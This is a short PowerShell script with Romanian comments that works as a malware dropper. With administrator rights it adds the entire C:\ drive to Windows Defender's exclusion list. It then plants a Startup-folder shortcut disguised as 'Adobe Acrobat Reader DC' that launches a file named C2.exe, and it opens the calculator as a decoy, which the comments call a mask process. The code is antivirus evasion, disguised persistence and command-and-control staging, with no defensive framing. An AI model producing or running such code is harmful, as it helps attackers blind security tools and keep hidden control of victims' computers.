function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole($adminRole)
}

if (-not (Test-Administrator)) {
    Write-Error "This script must be run as Administrator"
    exit 1
}

# Exclusion Path pentru antivirus
$pathToExclude = "C:\"  # Change to a more specific path

# Add the path to the Windows Defender exclusion list
Add-MpPreference -ExclusionPath $pathToExclude

# Verify that the exclusion was added
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($exclusions -contains $pathToExclude) {

	# Calea catre C2
	$progPath = "C:\Users\eduar\Desktop\C2.exe"

  # Calea catre Startup
	$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

# Calea catre noul shortcut
	$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "Adobe Acrobat Reader DC.lnk")

# Create a WScript.Shell COM object
	$wshShell = New-Object -ComObject WScript.Shell

# Create the shortcut
	$shortcut = $wshShell.CreateShortcut($shortcutPath)

# Set the target path for the shortcut
	$shortcut.TargetPath = $progPath 

# Save the shortcut
	$shortcut.Save()

#Pornirea procesului-masca (momentan e calculator)

    Start-Process calc
    Write-Host "Successfully added $pathToExclude to the exclusion list."
} else {
    Write-Error "Failed to add $pathToExclude to the exclusion list."
}
